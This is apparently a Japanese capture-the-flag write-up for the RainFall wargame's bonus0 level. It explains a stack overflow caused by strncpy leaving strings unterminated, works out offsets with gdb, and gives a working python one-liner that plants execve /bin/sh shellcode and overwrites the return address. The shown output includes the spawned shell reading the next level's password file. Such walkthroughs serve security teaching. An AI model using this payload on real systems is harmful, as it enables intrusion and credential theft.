# bonus9
## 方針
mainのlocal_3a [54];をバッファオーバーフローさせることでshellcodeを実行する。

### コードの整理

ppが呼び出される。
p(local_34, " - ");で
char local_34[20];に
strncpyをするが、strncpyは引数のnバイトを超えてたらヌル文字挿入しない。
だからstrcpy(param_1, local_34);には
local34が貫通してlocal20までcpyされる。

その後、strcat(param_1, local_20);でもう一度local_20[20];が追記される。

つまり、 20 + 20 + 1(' ') + 20でlocal_3a[54]がオーバーフローする,これを利用する。

### local100cのアドレス

```
(gdb) disass p
Dump of assembler code for function p:
.....
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
....

ebx            0xb7fd0ff4

(gdb) x/20x 0xbffff688-0x1008
0xbfffe680:     0x41414141
```
### local_3aからリターンアドレスまでのオフセット
0x4(stackframe) + 0x40 - 0x16 = 0x2e = 46バイト
$0xfffffff0,%espでアラインされてるから正確な数値がわからない
```
(gdb) disass main
Dump of assembler code for function main:
....
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
....
```

### ans

20(local34) + 20(local20) + 1(' ') + 20(local20)
42(offset) + 4(stack frame) + return addressだから
41 + 5（アライメントされてるからいい感じに調整）+ return addressになるようにreadさせる。
pのlocal_100c [4104];のスタックにシェルコードを置く。
ただし、pが２連続で呼ばれ、２回目のreadで上書きされないようなアドレスに配置する。

0xbfffe680:     0x41414141 から適当に10000くらい離れた位置にシェルコードをおく
0xbfffe680 + 1000 = bfffea68 アドレス

1回writeで書き込みたいが、2回readするため、読み込み上限までパディングする。


```
bonus0@RainFall:~$ (python -c "import sys; sys.stdout.write('A' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 3071 + '\n' + 'B' * 9  + '\x68\xea\xff\xbf'+ 'CCCC' + 'DDDD' + 'EEEE' + '\n')"; cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBh���CCCCDDD��� BBBBBBBBBh���CCCCDDD���
echo a
a
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```


## memo
